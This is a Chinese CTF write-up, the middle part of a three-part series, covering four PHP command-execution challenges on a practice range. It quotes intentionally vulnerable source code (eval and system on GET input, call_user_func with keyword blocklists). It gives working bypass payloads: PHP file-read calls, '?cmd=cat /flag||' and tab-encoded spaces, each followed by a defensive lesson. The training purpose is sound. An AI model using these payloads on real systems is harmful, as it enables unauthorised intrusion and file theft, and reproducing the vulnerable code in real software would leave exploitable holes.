#  黑名单不是防火墙 六边形靶场 RCE 中篇：disable_functions、分隔符、空格绕过  
原创 网安布道师
                    网安布道师  六边形攻防安全   2026-07-14 12:26  
  
> ❝  
> 六边形攻防靶场 Web → Rce 系列 · 共三篇  
  
中篇：disable_functions  
、分隔符、空格——继续拆 4 道绕过题。  
> ❞  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FaZFJ7xrqJZkjFa74dgTicN8Uw88uwEJk3NU9rjv4jIlnmBT0dbP3Ah3erCo3WzuOdCHsI04VfNxrj4Ka8hRR3amQQwm2W86iaN56ibpbnIu3Y/640?wx_fmt=png&from=appmsg "")  
  
上一篇解决的是“还有哪个命令执行入口可用”。从这一篇开始，限制会落到更细的语法层：执行函数几乎全禁、读文件黑名单、分隔符与空格过滤。  
  
环境：六边形攻防靶场，路径 **「题库 → Web → Rce」**  
。Payload 仅供授权练习。  
## 系列进度  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">篇目</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">覆盖题目</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">上</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">rce-cmdfunction1</span></code><section><span leaf=""> ~ </span><code><span leaf="">4</span></code></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">中（本文）</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">disable_functions</span></code><section><span leaf=""> ×2 / 分隔符 / 空格</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">下</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">敏感词 / 无回显 / 斜线 / 长度限制 ×2</span></section></td></tr></tbody></table>  
  
**「每题顺序」**  
：源码/环境 → 过滤点 → 绕过 → Payload → 结果 → 小结。  
## 先换一个目标：不执行命令，也能读文件  
  
CTF 目标常常是读 Flag。命令执行只是手段之一。若 system  
/exec  
 全挂，PHP 仍可能：  
```
scandir('/');  glob('/*');
readfile('/flag');  file_get_contents('/flag');
show_source('/flag');  include('/flag');
```  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">Shell 习惯</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">PHP 等价</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">ls</span></code><section><span leaf=""> / </span><code><span leaf="">ls /</span></code></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">scandir</span></code><section><span leaf=""> / </span><code><span leaf="">glob</span></code></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">cat /flag</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">readfile</span></code><section><span leaf=""> / </span><code><span leaf="">file_get_contents</span></code><span leaf=""> / </span><code><span leaf="">show_source</span></code><span leaf=""> 等</span></section></td></tr></tbody></table>  
## 第五题：rce-bypass_disable_functions  
  
**「平台路径」**  
：题库 → Web → Rce → rce-bypass_disable_functions  
**「难度」**  
：easy · 分值 35  
### 源码 / 环境分析  
  
入口与上篇同类，用户输入进 eval  
：  
```
<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];
    eval($code);
} else {
    highlight_file(__FILE__);
}
?>
```  
  
但环境 disable_functions**「基本禁用常见命令执行函数」**  
（system  
/exec  
/passthru  
/shell_exec  
/popen  
 等）。  
  
目标只需读 Flag，不必死磕冷门命令函数。  
### 过滤点  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">disable_functions</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">封命令执行，不自动封文件系统 API</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">仍可用</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">scandir</span></code><section><span leaf=""> / </span><code><span leaf="">glob</span></code><span leaf=""> / </span><code><span leaf="">readfile</span></code><span leaf=""> / </span><code><span leaf="">file_get_contents</span></code><span leaf=""> / </span><code><span leaf="">show_source</span></code><span leaf=""> / </span><code><span leaf="">include</span></code><span leaf=""> 等（以实机为准）</span></section></td></tr></tbody></table>  
### 绕过思路  
1. PHP 枚举目录找 Flag 路径  
  
1. 用仍可用的读文件函数输出  
  
### Payload  
```
?code=print_r(scandir('/'));
?code=var_dump(glob('/*'));
?code=readfile('/flag');
```  
  
其它等价：show_source  
、file_get_contents  
、include  
、require  
 等。  
### 结果  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FaZFJ7xrqJav2I5KK7yM81Bf0mxNZMBdoOyPLiaicfTuT4nicG64OMpx9GvBIjrb0oOWI0iatUg53k7IJicC0IiaticZ3J0LIOib7icicScqtzLLUoRKw/640?wx_fmt=png&from=appmsg "")  
  
rce-bypass_disable_functions  
 运行结果  
  
图：readfile('/flag') 直接回显 Flag，无需命令执行函数。  
### 本题小结  
  
disable_functions  
 不是完整沙箱，挡不住所有读文件与信息泄露能力。  
## 第六题：rce-bypass_disable_functions1  
  
**「平台路径」**  
：题库 → Web → Rce → rce-bypass_disable_functions1  
**「难度」**  
：easy · 分值 36  
### 源码 / 环境分析  
  
题目会 show_source  
 自身，核心逻辑接近：  
```
<?php
show_source('index.php');
$a = $_GET["a"];
$b = $_GET["b"];
if (preg_match("/exec'|passthru|proc_close|proc_open|popen|shell_exec|system|scandir|eval|assert|print_r|fread|fgets|var_dump|show_source|highlight_file/", $a)) {
    echo '1';
} else if (preg_match("/cat|tac|more|less|head|tail|nl|static-sh|paste|od|bzmore|bzless/i", $b)) {
    echo '2';
} else {
    call_user_func($a, $b);
}
?>
```  
### 过滤点  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">$a</span></code><section><span leaf=""> 黑名单</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">大量命令/读文件/调试函数名</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">$b</span></code><section><span leaf=""> 黑名单</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">常见 shell 读文件命令关键字</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">结构危险点</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「</span><code><span leaf="">call_user_func($a, $b)</span></code><span leaf="">」</span></strong><section><span leaf=""> —— 用户决定调谁</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">漏项</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">黑名单</span><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「没有」</span></strong><code><span leaf="">readfile</span></code></section></td></tr></tbody></table>  
### 绕过思路  
  
把 a  
 设为漏网函数名，b  
 设为 Flag 路径。  
### Payload  
```
?a=readfile&b=/flag
```  
  
等价于 readfile('/flag')  
。  
### 结果  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/FaZFJ7xrqJYdF2ib6yNZr8yrJFlMiahOOjJ2mwibBdCmmlw6ib9RC4NH4Zqwic4VqF2DmNuibIFP1mSlGh05JZePYibbHQS8UYNhNGwuSlol75u1f4/640?wx_fmt=jpeg "")  
  
rce-bypass_disable_functions1  
 运行结果  
  
图：?a=readfile&b=/flag 触发动态调用，Flag 出现在页面底部。  
### 本题小结  
  
动态调用必须用白名单映射；不能把用户输入直接当函数名。  
## 第七题：rce-bypassserparator  
> ❝  
> 平台题名保留拼写 serparator  
；考点是 separator。  
> ❞  
  
  
**「平台路径」**  
：题库 → Web → Rce → rce-bypassserparator  
**「难度」**  
：easy · 分值 37  
### 源码 / 环境分析  
```
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (!preg_match_all("/\;|\&/i", $cmd)) {
        system($cmd . " >/dev/null 2>&1");
    } else {
        echo "NoNoNo";
    }
} else {
    highlight_file(__FILE__);
}
?>
```  
  
注意最后一行：服务端在命令后**「硬拼」**  
了 >/dev/null 2>&1  
。  
### 过滤点  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">正则</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">拦截 </span><code><span leaf="">;</span></code><span leaf=""> 与 </span><code><span leaf="">&amp;</span></code></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">未拦</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">\|\|</span></code><section><span leaf="">、</span><code><span leaf="">\|</span></code><span leaf=""> 等</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">拼接</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">成功命令若直接接重定向，stdout 会被吞掉</span></section></td></tr></tbody></table>  
### 绕过思路  
1. 用 ||  
 代替 ;  
 / &  
 做连接  
  
1. 让读 Flag 命令**「成功」**  
，让 ||  
 右侧接住服务端追加的重定向，主命令 stdout 回到页面  
  
### Payload  
```
?cmd=cat /flag||
```  
  
完整 shell 效果近似：cat /flag|| >/dev/null 2>&1  
。  
### 结果  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FaZFJ7xrqJZsCuxic6DRXVINFuhciccnJ8GD8JSjJDebyiacAvFUE9gxkOcia153InLJItXrvcfDNiceLYiaQpIdicBsJiawP7qSjHtlhMXkgaic3adQ/640?wx_fmt=png&from=appmsg "")  
  
rce-bypassserparator  
 运行结果  
  
图：地址栏 URL 含 cmd=cat /flag||，页面回显 Flag。  
### 本题小结  
  
黑名单很难穷尽 Shell 连接语法；更稳的是不启动 Shell、参数数组化执行。  
## 第八题：rce-bypass_space  
  
**「平台路径」**  
：题库 → Web → Rce → rce-bypass_space  
**「难度」**  
：easy · 分值 38  
### 源码 / 环境分析  
  
入口为 ?cmd=  
，经正则后拼进 system  
/shell_exec  
 一类接口。  
  
完整正则以实机 highlight_file  
 为准；常见模式与第七题类似，会 **「ban 普通空格」**  
，并可能再拼 >/dev/null 2>&1  
。  
  
可先 highlight_file  
 / 试探：?cmd=ls /  
（带空格）是否直接报 ban，再试 %09  
。  
### 过滤点  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">空格 </span><code><span leaf="">0x20</span></code><span leaf=""> / </span><code><span leaf="">%20</span></code></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">通常被 ban</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">分隔符</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">;</span></code><code><span leaf="">&amp;</span></code><section><span leaf=""> 等常见 ban 项</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">未彻底覆盖</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">TAB </span><code><span leaf="">%09</span></code><span leaf=""> 等仍可当分词空白</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">叠加</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">若服务端拼了重定向，仍常需 </span><code><span leaf="">||</span></code><span leaf=""> 保住 stdout</span></section></td></tr></tbody></table>  
### 绕过思路  
  
用 %09  
（TAB）代替空格，必要时保留 ||  
。  
```
?cmd=ls%09/||
?cmd=cat%09/fl*||
```  
  
解码后近似：cat<TAB>/fl*||  
。  
### 结果  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FaZFJ7xrqJaj9a5RJdkBuDS0qZvRNZedmfZtCicn1QxIWysPrEt5IDP5mh8jKnM06KicJKH1Mxk11Gwibhh1GgdyXf3btgABMW6yrf3eIRyygE/640?wx_fmt=png&from=appmsg "")  
  
rce-bypass_space  
 运行结果  
  
图：地址栏 URL 中带 %09 Payload，页面回显 Flag。  
### 本题小结  
  
过滤要明确发生在哪个解码阶段。只查“肉眼可见的空格”，解码/Shell 解析后仍可能出现危险语义。  
## 中篇总结  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">题目</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">源码关键点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">突破</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">disable_functions</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">命令函数全禁</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">PHP 读文件 API</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">disable_functions1</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">call_user_func($a,$b)</span></code><section><span leaf=""> + 黑名单</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">a=readfile&amp;b=/flag</span></code></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">bypassserparator</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">只 ban </span><code><span leaf="">;</span></code><span leaf="">/</span><code><span leaf="">&amp;</span></code><span leaf=""> + 拼重定向</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">cat /flag||</span></code></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">bypass_space</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">ban 空格等</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">%09</span></code><section><span leaf=""> + </span><code><span leaf="">||</span></code></section></td></tr></tbody></table>  
  
下一篇：敏感词、无回显、斜线、长度限制——继续先抠源码。  
## 去哪练？  
  
**靶场注册：公众号回复【靶场邀请码】获取邀请码即可进行注册**  
  
打开 https://hexlab.fun/ → **「题库 → Web → Rce」**  
  
建议：先独立做，再回看文章复盘。  
  
关注 **「六边形攻防安全」**  
，下篇见：敏感词、无回显、斜线与长度限制。  
  
